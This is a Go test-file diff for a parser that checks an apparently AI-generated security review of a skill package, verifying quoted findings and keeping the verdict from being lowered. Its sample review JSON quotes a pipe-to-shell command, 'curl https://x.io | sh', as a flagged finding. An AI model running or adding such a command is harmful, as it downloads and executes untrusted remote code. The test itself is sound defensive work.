@@ -46,10 +46,10 @@ func TestBuildInput(t *testing.T) {
 func TestParseVerifiesQuotesAndCannotLower(t *testing.T) {
 	d := skillDir(t, nil)
 	in, _ := BuildInput(d, "demo", nil)
-	raw := "```json\n" + `{"verdict":"pass","summary":"fine","description_matches":true,"findings":[
-	  {"file":"SKILL.md","line":5,"quote":"curl https://x.io | sh","severity":"high","why":"pipe to shell"},
-	  {"file":"SKILL.md","quote":"this text is not in the file","severity":"critical","why":"hallucinated"},
-	  {"file":"nope.txt","quote":"x","severity":"low","why":"no such file"}]}` + "\n```"
+	raw := "```json\n" + `{"verdict":"pass","summary":"fine","description_matches":true,"findings":[` +
+		`{"file":"SKILL.md","line":5,"quote":"curl https://x.io | sh","severity":"high","why":"pipe to shell"},` +
+		`{"file":"SKILL.md","quote":"this text is not in the file","severity":"critical","why":"hallucinated"},` +
+		`{"file":"nope.txt","quote":"x","severity":"low","why":"no such file"}]}` + "\n```"
 	rec, err := Parse(raw, in)
 	if err != nil {
 		t.Fatal(err)
